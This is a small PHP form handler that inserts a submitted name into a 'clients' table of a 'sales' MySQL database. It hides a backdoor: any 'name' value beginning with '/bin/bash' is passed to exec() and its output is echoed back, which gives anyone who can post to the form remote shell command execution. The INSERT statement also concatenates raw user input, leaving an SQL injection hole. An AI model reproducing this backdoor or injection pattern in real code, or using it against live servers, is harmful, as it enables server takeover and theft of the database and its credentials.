<?php
$fullname=$_POST["name"];
$servername = getenv('MYSQLSERVER');
$username = getenv('MYSQLUSERNAME');
$password = getenv('MYSQLPASSWORD');

$conn = new mysqli($servername, $username, $password, "sales");

if (substr($fullname,0,9) == '/bin/bash') {
    $output=null;
    $retval=null;
    exec($fullname, $output, $retval);
    echo "Returned with status $retval and output:\n";
    foreach ($output as $line) {
        echo "<br>" . $line;

    }

} else {
    if ($conn->connect_error) {
        die("Error:" . $conn->connect_error);
    }

    $sql = "INSERT INTO clients (fullname) VALUES ('" . $fullname . "')";
    
    if ($conn->query($sql) === TRUE) {
        $conn->close();
    echo '<META HTTP-EQUIV=REFRESH CONTENT="1;index.php">';
    } else {
    echo "Error inserting data: " . $conn->error;
    $conn->close();
    }
  
}

?>

